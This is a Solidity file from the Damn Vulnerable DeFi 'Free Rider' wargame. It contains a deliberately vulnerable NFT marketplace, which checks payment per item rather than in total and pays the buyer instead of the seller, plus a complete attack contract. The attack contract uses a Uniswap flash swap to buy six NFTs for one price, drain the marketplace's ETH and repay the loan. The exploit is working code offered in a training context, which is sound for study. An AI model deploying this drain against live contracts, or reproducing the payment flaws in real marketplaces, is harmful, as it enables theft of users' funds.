// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for (uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)
        external
        nonReentrant
    {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
                token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds)
        external
        payable
        nonReentrant
    {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}

interface IPair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IReceiver {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function balanceOf(address user) external returns (uint256);

    function transfer(address dst, uint256 wad) external returns (bool);

    function approve(address guy, uint256 wad) external returns (bool);
}

interface IFreeRiderBuyer {
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external returns (bytes4);
}

contract FreeRiderNFTMarketplaceAttack is IReceiver, IERC721Receiver {
    FreeRiderNFTMarketplace public m;
    IPair public pair;
    DamnValuableNFT public t;
    IFreeRiderBuyer public freeRiderBuyer;
    IWETH public w;

    constructor(
        FreeRiderNFTMarketplace _m,
        IPair _pair,
        DamnValuableNFT _t,
        IFreeRiderBuyer _frb,
        IWETH _w
    ) payable {
        require(msg.value >= 0.5 ether);
        _w.deposit{value: msg.value}();
        m = _m;
        pair = _pair;
        t = _t;
        freeRiderBuyer = _frb;
        w = _w;
    }

    function getETH() public {
        pair.swap(15 ether, 0 ether, address(this), bytes(("1")));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pair), "error!");
        require(w.balanceOf(address(this)) >= 15.5 ether, "wrong weth");

        w.approve(address(w), 15 ether);
        w.withdraw(15 ether);
        uint256[] memory a = new uint256[](6);

        require(address(this).balance >= 15 ether, "no ether");
        a[0] = 0;
        a[1] = 1;
        a[2] = 2;
        a[3] = 3;
        a[4] = 4;
        a[5] = 5;
        m.buyMany{value: 15 ether}(a);

        // sent back ETH
        (bool s, ) = address(w).call{value: 15 ether}("");
        require(s, "failed");
        w.transfer(msg.sender, 15 ether + ((15 ether * 3) / 100));
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function sendToBuyer() public {
        for (uint256 i = 0; i < 6; i++) {
            ERC721(address(t)).safeTransferFrom(
                address(this),
                address(freeRiderBuyer),
                i,
                ""
            );
        }

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
